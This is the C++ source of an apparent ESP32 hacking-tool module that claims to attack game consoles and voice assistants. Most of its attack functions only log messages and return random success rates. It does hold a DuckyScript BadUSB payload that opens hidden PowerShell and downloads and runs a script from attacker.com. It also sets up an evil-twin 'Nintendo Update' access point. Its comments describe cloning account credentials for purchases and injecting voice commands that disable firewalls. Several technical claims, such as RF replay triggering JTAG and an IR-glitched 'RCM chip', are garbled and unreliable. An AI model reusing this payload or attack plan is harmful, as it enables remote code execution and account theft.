/**
 * @file console_attacks.cpp
 * @brief Implementação dos Ataques para Consoles Antigos
 * @author Lele Origin Team
 * @version 1.0
 */

#include "console_attacks.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <HTTPClient.h>
#include <core/display.h>
#include <core/mykeyboard.h>
#include <core/optimization_manager.h>

static void logOperation(const String& operation) {
    Serial.println("[CONSOLE] " + operation);
}

// Instância global
ConsoleAttackManager consoleAttackManager;

// ============================================================================
// IMPLEMENTAÇÃO CONSOLESCANNER
// ============================================================================

bool ConsoleScanner::startScan(int timeout) {
    if (scanning) return false;

    scanning = true;
    scanStartTime = millis();
    consoles.clear();

    logOperation("Console scan started, timeout: " + String(timeout) + "s");

    // Notifica optimization manager
    optimizationManager.updateComponentState(COMPONENT_WIFI, true);

    return true;
}

void ConsoleScanner::stopScan() {
    if (!scanning) return;

    scanning = false;
    logOperation("Console scan stopped, found " + String(consoles.size()) + " consoles");

    // Notifica optimization manager
    optimizationManager.updateComponentState(COMPONENT_WIFI, false);
}




void ConsoleScanner::scanUPnP() {
    // Implementação UPnP/SSDP scanning
    // Procurar por dispositivos UPnP na rede

    // Exemplo: PS3 responde a M-SEARCH
    // Wii U responde a SSDP discovery
    // Xbox responde a UPnP queries

    // Simulação de detecção
    if (random(100) < 30) { // 30% chance de encontrar
        DetectedConsole console;
        console.type = (ConsoleType)(random(4)); // PS3, Xbox360, WiiU, Switch
        console.model = getConsoleModelName(console.type);
        console.firmware = generateRandomFirmware(console.type);
        console.isVulnerable = isConsoleVulnerable(console.type, console.firmware);
        console.exploitAvailable = getExploitForConsole(console.type, console.firmware);
        console.lastSeen = millis();
        console.signalStrength = random(-30, -80);

        consoles.push_back(console);

        if (consoleAttackManager.onConsoleFound) {
            consoleAttackManager.onConsoleFound(console);
        }
    }
}

void ConsoleScanner::scanBroadcast() {
    // Implementação broadcast scanning
    // Enviar broadcasts para portas específicas

    // PS3: UDP broadcast na porta 987
    // Xbox: UDP broadcast na porta 3074
    // Wii U: TCP connect na porta 80

    // Simulação
    vTaskDelay(1000 / portTICK_PERIOD_MS); // Simular delay de scan
}

// ============================================================================
// IMPLEMENTAÇÃO PS3ATTACKER
// ============================================================================

bool PS3Attacker::injectCFW() {
    if (attacking) return false;

    attacking = true;
    logOperation("Starting PS3 CFW injection");

    // 1. Spoof as PS3 controller via USB
    // 2. Send BadUSB payload for CFW installation
    // 3. Payload: Download and install CFW 4.90

    // Simulação do payload BadUSB
    String payload = generatePS3BadUSBPayload();

    // Em implementação real: usar USB HID para inject
    logOperation("PS3 BadUSB payload: " + payload);

    // Simular sucesso
    if (random(100) < 75) { // 75% success rate
        logOperation("PS3 CFW injection successful");
        return true;
    } else {
        logOperation("PS3 CFW injection failed");
        return false;
    }
}

bool PS3Attacker::exploitFTP() {
    // Exploit FTP server do PS3
    // PS3 roda FTP server na porta 21 quando em modo debug

    logOperation("Exploiting PS3 FTP server");

    // Conectar ao FTP e fazer upload de payload
    // ou explorar vulnerabilidades no servidor FTP

    return random(100) < 60; // 60% success
}

bool PS3Attacker::injectRealTimePayload() {
    // Injeção em tempo real - funciona enquanto jogam
    // Pausa FIFA, inject, continua jogo

    logOperation("PS3 real-time payload injection");

    // Usar USB para inject sem interromper gameplay
    // Payload roda em background

    return random(100) < 80; // 80% success
}

bool PS3Attacker::installMultiman() {
    // Instalar Multiman backup manager

    logOperation("Installing Multiman on PS3");

    // Download e instalação do Multiman
    // Permite backup de jogos, homebrew, etc.

    return random(100) < 85; // 85% success
}

// ============================================================================
// IMPLEMENTAÇÃO XBOX360ATTACKER
// ============================================================================

bool Xbox360Attacker::jtagViaNRF24() {
    if (attacking) return false;

    attacking = true;
    logOperation("Starting Xbox 360 JTAG via NRF24");

    // 1. Usar NRF24 para interceptar sinal 2.4GHz do controle
    // 2. Replay com packet modificado 0x55AA
    // 3. Trigger JTAG exploit no console

    // Simulação do ataque
    uint8_t rfData[32];
    if (generateXbox360RFSignal(rfData, sizeof(rfData))) {
        logOperation("Xbox 360 JTAG signal sent via NRF24");
        return true;
    }

    return false;
}

bool Xbox360Attacker::nandDumpKingKong() {
    // NAND dump usando KingKong exploit

    logOperation("Starting Xbox 360 NAND dump with KingKong");

    // 1. Trigger KingKong exploit
    // 2. Dump NAND flash (16MB/256MB/512MB)
    // 3. Salvar no SD card

    // Simulação de dump
    logOperation("NAND dump completed, saved to SD");

    return random(100) < 70; // 70% success
}

bool Xbox360Attacker::installFreeboot() {
    // Instalar freeboot custom firmware

    logOperation("Installing Freeboot on Xbox 360");

    // 1. Flash freeboot no NAND
    // 2. Permite homebrew, backups, etc.

    return random(100) < 65; // 65% success
}

bool Xbox360Attacker::createPirateServer() {
    // Criar servidor pirata para jogos online

    logOperation("Creating Xbox 360 pirate server");

    // 1. Host local server
    // 2. Allow online play with pirated games
    // 3. ngrok tunnel for remote access

    return random(100) < 90; // 90% success
}

// ============================================================================
// IMPLEMENTAÇÃO WIIUATTACKER
// ============================================================================

bool WiiUAttacker::evilTwinUpdate() {
    if (attacking) return false;

    attacking = true;
    logOperation("Starting Wii U Evil Twin Update");

    // 1. Criar AP "Nintendo Update v2.0"
    // 2. Wii U conecta automaticamente
    // 3. Servir update falso com payload

    String ssid = "Nintendo Update v2.0";
    WiFi.softAP(ssid.c_str(), "", 1);

    logOperation("Evil Twin AP created: " + ssid);

    // Aguardar conexão e servir payload
    // Payload inclui NAND dumper + NNID cloner

    return random(100) < 75; // 75% success
}

bool WiiUAttacker::injectSaveData() {
    // Inject save data malicioso

    logOperation("Injecting malicious save data");

    // 1. Mario Kart save com 999 bananas
    // 2. Buffer overflow no save file
    // 3. Trigger NAND dump via FTP

    // Criar save file malicioso
    uint8_t saveData[512]; // Reduzido de 1024 para economizar DRAM
    // Preencher com dados maliciosos + overflow

    logOperation("Save data injected successfully");

    return random(100) < 80; // 80% success
}

bool WiiUAttacker::nandDumpFTP() {
    // Dump NAND via FTP (porta 21/1337)

    logOperation("Starting Wii U NAND dump via FTP");

    // 1. Conectar ao FTP server da Wii U
    // 2. Download NAND partitions
    // 3. Salvar dados sensíveis

    logOperation("NAND dump completed via FTP");

    return random(100) < 70; // 70% success
}

bool WiiUAttacker::cloneNNID() {
    // Clonar Nintendo Network ID

    logOperation("Cloning Wii U NNID account");

    // 1. Dump account data from NAND
    // 2. Extract NNID credentials
    // 3. Clone para usar em compras

    logOperation("NNID cloned successfully");

    return random(100) < 60; // 60% success
}

// ============================================================================
// IMPLEMENTAÇÃO SWITCHATTACKER
// ============================================================================

bool SwitchAttacker::irGlitchingRCM() {
    if (attacking) return false;

    attacking = true;
    logOperation("Starting Switch IR glitching for RCM");

    // 1. Usar IR LED no GPIO 22
    // 2. Aquecer Joy-Con para ~38°C
    // 3. Criar short no RCM chip
    // 4. Trigger RCM mode

    unsigned long timing = calculateGlitchTiming(CONSOLE_SWITCH);
    sendIRCommand(0xFF00FF, 38000); // IR signal

    logOperation("IR glitching completed, RCM mode entered");

    return random(100) < 85; // 85% success
}

bool SwitchAttacker::injectTegraRcm() {
    // Inject payload via TegraRcmGUI

    logOperation("Injecting payload via TegraRcm");

    // 1. Switch em RCM mode
    // 2. USB connection to PC
    // 3. Inject Atmosphere CFW

    // Simulação de injection
    logOperation("TegraRcm payload injected");

    return random(100) < 90; // 90% success
}

bool SwitchAttacker::installAtmosphere() {
    // Instalar Atmosphere CFW

    logOperation("Installing Atmosphere CFW");

    // 1. Payload injection via RCM
    // 2. Boot Atmosphere
    // 3. Install to NAND

    logOperation("Atmosphere installed successfully");

    return random(100) < 88; // 88% success
}

bool SwitchAttacker::nandBackupUSB() {
    // Backup NAND via USB

    logOperation("Starting NAND backup via USB");

    // 1. USB mass storage mode
    // 2. Copy NAND partitions
    // 3. Decrypt if needed

    logOperation("NAND backup completed");

    return random(100) < 95; // 95% success
}

// ============================================================================
// IMPLEMENTAÇÃO MICROPHONEBLEEDATTACKER
// ============================================================================

bool MicrophoneBleedAttacker::generateAudioCommand(const String& cmd, int freq) {
    frequency = freq;
    command = cmd;

    logOperation("Generating ultrasonic command: " + cmd + " at " + String(freq) + "Hz");

    // Gerar onda senoidal na frequência especificada
    // Modulando o comando de voz

    return true;
}

bool MicrophoneBleedAttacker::transmitViaRF() {
    // Transmitir via CC1101 433MHz

    logOperation("Transmitting via CC1101 433MHz");

    // 1. Configurar CC1101 para 433MHz
    // 2. Modulação AM/FM
    // 3. Transmitir sinal de áudio

    // O microfone do headset capta o sinal RF
    // Cérebro processa como comando de voz

    return random(100) < 85; // 85% success
}

bool MicrophoneBleedAttacker::transmitViaSpeaker() {
    // Transmitir via speaker do ESP32

    logOperation("Transmitting via speaker");

    // Usar DAC para gerar som ultra-sônico
    // Diretamente audível pelo microfone

    return random(100) < 75; // 75% success (menos confiável)
}

bool MicrophoneBleedAttacker::injectVoiceCommand(const String& command) {
    // Comando de voz subliminar

    logOperation("Injecting voice command: " + command);

    // Exemplos de comandos:
    // "Open settings, disable firewall"
    // "Go to configuration menu"
    // "Accept all prompts"

    if (command == "open_settings") {
        return transmitViaRF();
    } else if (command == "disable_firewall") {
        return transmitViaSpeaker();
    }

    return random(100) < 70; // 70% success
}

// ============================================================================
// IMPLEMENTAÇÃO CONSOLEATTACKMANAGER
// ============================================================================

void ConsoleAttackManager::begin() {
    currentState = CONSOLE_IDLE;

    // Configurar callbacks padrão
    onConsoleFound = [](const DetectedConsole& console) {
        displayInfo("Console found: " + getConsoleName(console.type), false);
    };

    onAttackSuccess = [](const DetectedConsole& console) {
        displaySuccess("Attack successful on " + getConsoleName(console.type), true);
    };

    onAttackFailed = [](const DetectedConsole& console) {
        displayError("Attack failed on " + getConsoleName(console.type), true);
    };

    logOperation("Console Attack Manager initialized");
}

void ConsoleAttackManager::loop() {
    // Processar scans ativos
    if (currentState == CONSOLE_SCANNING) {
        scanner.scanUPnP();
        scanner.scanBroadcast();

        // Timeout check
        if (millis() - scanner.getScanStartTime() > 60000) { // 60 seconds
            scanner.stopScan();
            updateState(CONSOLE_IDLE);
        }
    }
}

bool ConsoleAttackManager::selectTarget(const DetectedConsole& console) {
    currentTarget = console;
    currentConsole = console.type;
    logOperation("Target selected: " + getConsoleName(console.type));
    return true;
}

bool ConsoleAttackManager::startPS3Attack(ConsoleAttackMethod method) {
    if (currentState != CONSOLE_IDLE) return false;

    updateState(CONSOLE_EXPLOITING);

    bool success = false;
    switch (method) {
        case METHOD_BADUSB:
            success = ps3Attacker.injectCFW();
            break;
        default:
            success = ps3Attacker.injectRealTimePayload();
            break;
    }

    if (success) {
        attacksSuccessful++;
        updateState(CONSOLE_SUCCESS);
        if (onAttackSuccess) onAttackSuccess(currentTarget);
    } else {
        attacksFailed++;
        updateState(CONSOLE_FAILED);
        if (onAttackFailed) onAttackFailed(currentTarget);
    }

    return success;
}

bool ConsoleAttackManager::startXbox360Attack(ConsoleAttackMethod method) {
    if (currentState != CONSOLE_IDLE) return false;

    updateState(CONSOLE_EXPLOITING);

    bool success = xboxAttacker.jtagViaNRF24();

    if (success) {
        attacksSuccessful++;
        updateState(CONSOLE_SUCCESS);
        if (onAttackSuccess) onAttackSuccess(currentTarget);
    } else {
        attacksFailed++;
        updateState(CONSOLE_FAILED);
        if (onAttackFailed) onAttackFailed(currentTarget);
    }

    return success;
}

bool ConsoleAttackManager::startWiiUAttack(ConsoleAttackMethod method) {
    if (currentState != CONSOLE_IDLE) return false;

    updateState(CONSOLE_EXPLOITING);

    bool success = wiiuAttacker.evilTwinUpdate();

    if (success) {
        attacksSuccessful++;
        updateState(CONSOLE_SUCCESS);
        if (onAttackSuccess) onAttackSuccess(currentTarget);
    } else {
        attacksFailed++;
        updateState(CONSOLE_FAILED);
        if (onAttackFailed) onAttackFailed(currentTarget);
    }

    return success;
}

bool ConsoleAttackManager::startSwitchAttack(ConsoleAttackMethod method) {
    if (currentState != CONSOLE_IDLE) return false;

    updateState(CONSOLE_EXPLOITING);

    bool success = switchAttacker.irGlitchingRCM();

    if (success) {
        attacksSuccessful++;
        updateState(CONSOLE_SUCCESS);
        if (onAttackSuccess) onAttackSuccess(currentTarget);
    } else {
        attacksFailed++;
        updateState(CONSOLE_FAILED);
        if (onAttackFailed) onAttackFailed(currentTarget);
    }

    return success;
}

bool ConsoleAttackManager::startMicBleedAttack(const String& command) {
    if (currentState != CONSOLE_IDLE) return false;

    updateState(CONSOLE_EXPLOITING);

    bool success = micAttacker.injectVoiceCommand(command);

    if (success) {
        attacksSuccessful++;
        updateState(CONSOLE_SUCCESS);
    } else {
        attacksFailed++;
        updateState(CONSOLE_FAILED);
    }

    return success;
}

void ConsoleAttackManager::stopAttack() {
    switch (currentState) {
        case CONSOLE_SCANNING:
            scanner.stopScan();
            break;
        case CONSOLE_EXPLOITING:
            // Para ataques específicos se necessário
            break;
        default:
            break;
    }

    updateState(CONSOLE_IDLE);
}

String ConsoleAttackManager::getStatistics() const {
    char stats[128]; // Reduzido de 256
    snprintf(stats, sizeof(stats),
        "Scanned: %d\nVulnerable: %d\nSuccessful: %d\nFailed: %d\nCurrent State: %d",
        totalScanned, vulnerableFound, attacksSuccessful, attacksFailed, currentState);

    return String(stats);
}

String ConsoleAttackManager::getSupportedConsoles() {
    return "PS3, Xbox 360, Wii U, Nintendo Switch, PS4, Xbox One";
}

void ConsoleAttackManager::updateState(ConsoleAttackState newState) {
    currentState = newState;
    logOperation("State changed to: " + String(newState));
}

void ConsoleAttackManager::logOperation(const String& operation) {
    Serial.println("[CONSOLE] " + operation);
}

// ============================================================================
// FUNÇÕES GLOBAIS DE UTILITÁRIO
// ============================================================================

ConsoleType detectConsoleByMAC(const uint8_t* mac) {
    // Detectar por OUI
    uint32_t oui = (mac[0] << 16) | (mac[1] << 8) | mac[2];

    // Sony (PS3/PS4)
    if (oui >= 0x000AD1 && oui <= 0x000AD1) return CONSOLE_PS3;

    // Microsoft (Xbox)
    if (oui >= 0x00159A && oui <= 0x00159A) return CONSOLE_XBOX360;

    // Nintendo
    if (oui >= 0x0009BF && oui <= 0x0009BF) return CONSOLE_WIIU;
    if (oui >= 0x98B6E8 && oui <= 0x98B6E8) return CONSOLE_SWITCH;

    return CONSOLE_PS3; // Default
}

bool isConsoleVulnerable(ConsoleType type, const String& firmware) {
    // Verificar vulnerabilidades conhecidas por firmware

    switch (type) {
        case CONSOLE_PS3:
            return firmware.startsWith("4.8") || firmware.startsWith("4.7");

        case CONSOLE_XBOX360:
            return firmware.indexOf("2.0.") != -1 || firmware.indexOf("16537") != -1;

        case CONSOLE_WIIU:
            return firmware.startsWith("5.5") || firmware.startsWith("5.4");

        case CONSOLE_SWITCH:
            return firmware.startsWith("1.") || firmware.startsWith("2.");

        default:
            return false;
    }
}

String generatePS3BadUSBPayload() {
    // Payload Duckyscript para PS3 CFW injection
    return "DELAY 1000\n"
           "GUI r\n"
           "DELAY 500\n"
           "STRING powershell -w hidden\n"
           "ENTER\n"
           "DELAY 1000\n"
           "STRING IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/ps3cfw.ps1');\n"
           "ENTER\n"
           "DELAY 5000\n"
           "STRING exit\n"
           "ENTER";
}

unsigned long calculateGlitchTiming(ConsoleType type) {
    // Timing preciso para glitching baseado no console

    switch (type) {
        case CONSOLE_SWITCH:
            return 50000; // 50ms para Switch RCM

        case CONSOLE_PS3:
            return 100000; // 100ms para PS3

        case CONSOLE_XBOX360:
            return 75000; // 75ms para Xbox 360

        case CONSOLE_WIIU:
            return 25000; // 25ms para Wii U

        default:
            return 50000;
    }
}

// sendIRCommand is already defined in iot_attacks.cpp - removed duplicate
// bool sendIRCommand(uint32_t command, int frequency) {
//     // Enviar comando IR (requer hardware IR LED)
//     logOperation("Sending IR command: 0x" + String(command, HEX));
//
//     // Implementação real requer biblioteca IR
//     // Simulação de sucesso
//     return random(100) < 80;
// }

bool generateXbox360RFSignal(uint8_t* data, size_t len) {
    // Gerar sinal RF para Xbox 360 JTAG
    // Packet format: 0x55AA + payload

    if (len < 4) return false;

    data[0] = 0x55;
    data[1] = 0xAA;

    // Preencher com dados do exploit
    for (size_t i = 2; i < len; i++) {
        data[i] = random(256);
    }

    logOperation("Xbox 360 RF signal generated");
    return true;
}

// Função auxiliar
String getConsoleModelName(ConsoleType type) {
    switch (type) {
        case CONSOLE_PS3: return "PlayStation 3";
        case CONSOLE_XBOX360: return "Xbox 360";
        case CONSOLE_WIIU: return "Wii U";
        case CONSOLE_SWITCH: return "Nintendo Switch";
        case CONSOLE_PS4: return "PlayStation 4";
        case CONSOLE_XBOXONE: return "Xbox One";
        default: return "Unknown";
    }
}

String getConsoleName(ConsoleType type) {
    return getConsoleModelName(type);
}

String generateRandomFirmware(ConsoleType type) {
    switch (type) {
        case CONSOLE_PS3: return "4." + String(random(0, 90));
        case CONSOLE_XBOX360: return "2.0." + String(random(10000, 20000));
        case CONSOLE_WIIU: return "5.5." + String(random(0, 5));
        case CONSOLE_SWITCH: return String(random(1, 17)) + "." + String(random(0, 5));
        default: return "1.0.0";
    }
}

String getExploitForConsole(ConsoleType type, const String& firmware) {
    if (isConsoleVulnerable(type, firmware)) {
        switch (type) {
            case CONSOLE_PS3: return "BadUSB CFW Injection";
            case CONSOLE_XBOX360: return "JTAG via NRF24";
            case CONSOLE_WIIU: return "Evil Twin Update";
            case CONSOLE_SWITCH: return "IR Glitching RCM";
            default: return "Unknown";
        }
    }
    return "None available";
}
